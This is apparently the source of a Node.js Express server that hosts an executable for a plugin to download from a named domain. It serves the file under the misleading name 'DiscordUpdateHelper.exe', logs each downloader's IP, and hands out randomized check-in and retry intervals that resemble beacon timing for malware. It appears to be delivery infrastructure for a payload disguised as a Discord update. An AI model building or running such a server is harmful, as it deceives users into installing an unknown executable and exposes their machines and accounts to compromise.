const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Path to the clean EXE you want served
const EXE_PATH = path.join(__dirname, 'resource.exe');

// ── /client.exe — serves the raw binary unchanged ──────────────────────────
app.get('/client.exe', (req, res) => {
    const clientIP = req.ip || req.connection.remoteAddress;

    if (!fs.existsSync(EXE_PATH)) {
        console.error(`[ERROR] resource.exe not found at: ${EXE_PATH}`);
        return res.status(500).send('File not found on server');
    }

    const stat = fs.statSync(EXE_PATH);

    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', 'attachment; filename="DiscordUpdateHelper.exe"');
    res.setHeader('Content-Length', stat.size);
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');

    const readStream = fs.createReadStream(EXE_PATH);
    readStream.pipe(res);

    readStream.on('error', (err) => {
        console.error('[ERROR] Stream error:', err.message);
        if (!res.headersSent) res.status(500).send('Stream error');
    });

    console.log(`[${new Date().toISOString()}] Delivered client.exe to ${clientIP} (${stat.size} bytes)`);
});

// ── /config — lightweight config endpoint ──────────────────────────────────
app.get('/config', (req, res) => {
    const clientIP = req.ip || req.connection.remoteAddress;
    res.json({
        updateInterval: 3600000 + Math.floor(Math.random() * 1800000),
        retryInterval: 300000 + Math.floor(Math.random() * 300000),
        maxRetries: 3,
        version: '2.4.1',
        timestamp: Date.now()
    });
});

// ── Health check ───────────────────────────────────────────────────────────
app.get('/', (req, res) => {
    const exists = fs.existsSync(EXE_PATH);
    const stat = exists ? fs.statSync(EXE_PATH) : null;
    res.json({
        status: exists ? 'ok' : 'missing-exe',
        exeSize: stat ? stat.size : 0,
        endpoints: ['/client.exe', '/config']
    });
});

app.listen(PORT, () => {
    console.log(`[Frame Server] Running on port ${PORT}`);
    console.log(`[Frame Server] Expected domain: https://enhancements.lol`);
    console.log(`[Frame Server] Plugin will download: https://enhancements.lol/client.exe`);
    const exists = fs.existsSync(EXE_PATH);
    console.log(`[Frame Server] resource.exe: ${exists ? `FOUND (${fs.statSync(EXE_PATH).size} bytes)` : 'MISSING'}`);
    console.log(`[Frame Server] Endpoints: /client.exe, /config`);
});
